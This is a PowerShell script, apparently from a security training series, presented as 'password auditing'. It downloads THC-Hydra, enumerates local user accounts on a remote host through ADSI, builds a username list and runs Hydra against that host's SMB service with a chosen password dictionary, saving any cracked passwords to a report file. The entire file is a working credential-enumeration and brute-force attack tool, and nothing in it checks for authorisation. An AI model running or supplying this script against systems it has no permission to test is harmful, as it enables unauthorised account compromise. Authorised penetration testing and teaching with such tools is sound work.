# Problem: We need to get the names on the remote server for password auditing

# Solution: Write a Powershell script to remotely grab the usernames and save 
# them to a text file for the password cracker Hydra

# Local account and group query.
# Written by Jeremy Martin - jeremy@informationwarfarecenter.com
# For more episodes of Cyber Secrets, visit youtube.com/IWCCyberSec
# www.informationwarfarecenter.com or Intelligenthacking.com

# Clear the page

clear

# Set up the array

$results = @()

# Gather the IP address

$HostName = Read-Host -Prompt "Please Enter the target the you want to search (Example: 192.168.0.1)"

# Point to the password file to use

$PasswordFile = Read-Host -Prompt "Please Enter the password dictionary to use"

# Set the report file

$Report = "$HostName-Names.txt"

# Download THC-Hydra from https://github.com/maaaaz/thc-hydra-windows

curl "https://github.com/maaaaz/thc-hydra-windows/archive/master.zip" -OutFile "master.zip"

# Expand the downloaded archive file

Expand-Archive –Path "master.zip" -DestinationPath ".\" -Force

# Set up the program into the folder hydra

Rename-Item ".\thc-hydra-windows-master" -NewName ".\hydra"

# Reuse the code from Lab 1

$adsi = [ADSI]"WinNT://$HostName"
$adsi.Children | where {$_.SchemaClassName -eq 'user'} | Foreach-Object {
    $groups = $_.Groups() | Foreach-Object {$_.GetType().InvokeMember("Name", 'GetProperty', $null, $_, $null)}
    $_ | Select-Object @{n='UserName';e={$_.Name}},@{n='Groups';e={$groups -join ';'}}
    if ($_.Name -icontains "---"){
    } else {
        Select-Object -unique
        $results += New-Object PSObject $_.Name
    }
}

# Export the file to a dictionary with UTF8 encoding

$results | Out-File $Report -Encoding utf8

# Prep the Hydra application to use both the 
# password and username list built

$Hydra = ".\hydra\hydra.exe"
$HydraParams = @('-L', $Report, '-P', $PasswordFile, $HostName, 'smb') 
$Prms = $HydraParams.Split(" ")
$Passwords = & "$Hydra" $Prms

# Create a report based on Hydra's results

$Passwords | Out-File "$HostName-passwords.txt" 
Invoke-Item "$HostName-passwords.txt"
